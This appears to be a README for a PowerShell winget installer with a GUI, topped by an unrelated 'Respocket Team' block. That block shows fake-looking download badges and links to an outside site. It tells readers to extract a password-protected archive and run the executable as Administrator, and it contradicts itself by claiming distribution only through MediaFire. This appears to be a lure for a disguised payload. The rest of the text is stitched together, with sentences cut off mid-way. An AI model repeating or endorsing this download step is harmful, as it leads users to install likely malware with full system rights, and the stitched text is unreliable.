<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# modular-installer

A single-file PowerShell script with a dark-themed WPF GUI that installs software through
## Requirements

- Windows 10/11 with `winget` (the "App Installer" package)
- Windows PowerShell 5.1 or PowerShell 7 on Windows
- Administrator rights (the script asks for them itself)

## Usage

```powershell
powershell -ExecutionPolicy Bypass -File .\Install-Software.ps1
```

If the script isn't running as administrator (or isn't in STA mode, which WPF needs), it restarts itself
with a UAC prompt. Run it from a saved `.ps1` file, not pasted into a console, so it can do that.

## Double-click .exe

Build a standalone `ModularInstaller.exe` that you can double-click, pin to the taskbar or copy anywhere:

```powershell
powershell -ExecutionPolicy Bypass -File .\Build-Exe.ps1
```

The result is `dist\ModularInstaller.exe` (about 50 KB). Nothing is downloaded or installed to build it: the
script uses the C# compiler (`csc.exe`) that ships with Windows.

- **One file:** the script is embedded inside the exe, so it runs without the `.ps1` next to it.
- **Admin:** the exe's manifest requests Administrator rights, so Windows shows the UAC prompt on launch.
- **No console window:** only the installer window appears.
- **Rebuild after edits:** the script is embedded at build time, so run the build again after changing
  `Install-Software.ps1` (for example the `$Apps` catalog).
- **Dry run:** `ModularInstaller.exe -DryRun` simulates winget, like the script's switch. Build with
  `-NoElevate` if you want a test exe that doesn't prompt for admin (`.\Build-Exe.ps1 -NoElevate -OutFile test.exe`).
- **SmartScreen:** the exe is unsigned, so Windows may show "unknown publisher" on the first run. Some antivirus
  products are also wary of unsigned custom executables; building it yourself from this source is the safeguard.
- The exe needs Windows PowerShell 5.1 (built into Windows 10/11).

## System updates

| Button             | What it runs                                                                                  |
| ------------------ | --------------------------------------------------------------------------------------------- |
| **Update Apps**    | `winget upgrade --all --include-unknown --silent --accept-package-agreements --accept-source-agreements` |
### Dry run

```powershell
powershell -ExecutionPolicy Bypass -File .\Install-Software.ps1 -DryRun
```

Skips the elevation requirement and simulates winget and Windows Update with fake output, so you can try the
GUI without installing anything. Any app whose id ends in `.Fail` simulates a failed install.

## Adding apps

Edit the `$Apps` table near the top of `Install-Software.ps1`:

```powershell
$Apps = @(
    @{ Category = 'Utilities'; Name = '7-Zip'; WingetId = '7zip.7zip'; PreChecked = $true }
    # ...
)
```

| Field        | Meaning                                                         |
| ------------ | --------------------------------------------------------------- |
| `Category`   | Heading the app is grouped under (order of first appearance)    |
| `Name`       | Label shown in the list                                         |
| `WingetId`   | Exact winget package id (find it with `winget search <name>`)   |
| `PreChecked` | `$true` to have the box ticked when the window opens            |

Ids may only contain letters, digits, `.`, `_`, `+` and `-`, and may not start with `-`; anything else is
rejected. The whole table is validated when the program starts: a missing field, an empty or duplicate id or a
non-boolean `PreChecked` shows a message listing every problem instead of starting.

## How it works

- Every action (install, app upgrade, Windows Update) is a small *job* object; the worker runs a list of jobs
  on a separate **Runspace** so the window stays responsive.
- The worker starts each job's program directly, e.g. `winget install --exact --id <Id> --silent --accept-package-agreements --accept-source-agreements`
  (no `cmd.exe`, no shell parsing), and reads stdout and stderr concurrently, line by line.
- Lines go onto a thread-safe queue. A `DispatcherTimer` on the UI thread drains the queue into the log,
  so the worker never touches the UI directly.
- Spinner characters and block progress bars are filtered out of the log.
- winget's "already installed" and "already up to date" exit codes count as success; a hash mismatch gets a
  plain-language explanation.
- **Cancel** skips the remaining tasks after the current one finishes and never kills an installer by itself.
  A second click (**Stop now**) force-stops the running task after a confirmation. Closing the window during an
  install asks first, then stops the running task and everything it started.

## Security & reliability

- **Elevated code paths:** programs are always started by full path (winget from its fixed per-user alias
  location, `powershell.exe` and `taskkill.exe` from System32), never looked up on `PATH` at run time. There is
  no `cmd.exe` in the real install path, and app names are never placed on a command line.
- **Windows Update supply chain:** the elevated child only loads PSWindowsUpdate from `Program Files`
  (writable by administrators only). Every code file must carry a valid Authenticode signature from the module
  author; a tampered, unsigned or extra file makes the job stop with a clear error before anything is imported.
- **Single instance:** a second copy refuses to start (two installers would fight over the Windows Installer lock).
- **Responsive under load:** each timer tick has a 30 ms budget and the pending backlog is capped, so a program
  that prints tens of thousands of lines cannot freeze the window (a 60,000-line flood was tested); very long
  lines are truncated.
- **Build:** `Build-Exe.ps1` refuses to embed a script with syntax errors or non-ASCII characters, treats compiler
  warnings as errors, and writes a `.sha256` next to the exe.

Known limits, stated plainly:

- The exe is **unsigned** (no code-signing certificate), so SmartScreen may warn on the first run.
- winget is an app-execution alias and cannot be signature-checked, so it is trusted by its fixed location only.
- Running the plain `.ps1` from a folder that non-administrators can edit lets them change what an elevated run
  executes; the built `.exe` embeds the script and avoids that.
- stdout and stderr are separate pipes, so their relative order is best-effort (winget writes nearly everything
  to stdout).
- `winget upgrade --all --include-unknown` updates every package winget can identify, including ones whose
  installed version is unknown, which can upgrade software you deliberately left alone.

## Default catalog

| Category                                  | Apps                                                                |
| ----------------------------------------- | ------------------------------------------------------------------- |
| Runtimes & Frameworks                     | Visual C++ Runtimes All-In-One, .NET 8 Desktop Runtime              |
| System Utilities                          | 7-Zip, Notepad++, Microsoft PowerToys                               |
| Dev & Engineering                         | Git, VS Code, Windows Terminal, Sysinternals Suite                  |
| Lab, Virtualization & Network Operations  | Oracle VirtualBox, Vagrant, Nmap, WinSCP, PuTTY                     |
| Hardware Diagnostics & System Monitoring  | HWiNFO, CrystalDiskInfo, CPU-Z, FurMark                             |
| Fabrication & Design (3D CAD & Slicers)   | Bambu Studio, OrcaSlicer, FreeCAD                                   |
| Diverse Daily Productivity                | VLC Media Player, ShareX, Obsidian                                  |

Everything in the last four categories starts unchecked; the `PreChecked` flags in `$Apps` control the rest.
Winget ids are matched case-sensitively (`--exact`), so spell them exactly as `winget search` prints them.

Edit the `$Apps` table to change it. If an install fails with a hash mismatch, the publisher replaced the file
after the winget manifest was written (this happens with unversioned download URLs, such as Sysinternals Suite
right after a release). winget blocks it on purpose; try again once the manifest is updated.


---

MIT License

Copyright (c) 2026 Mark S. Smith

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
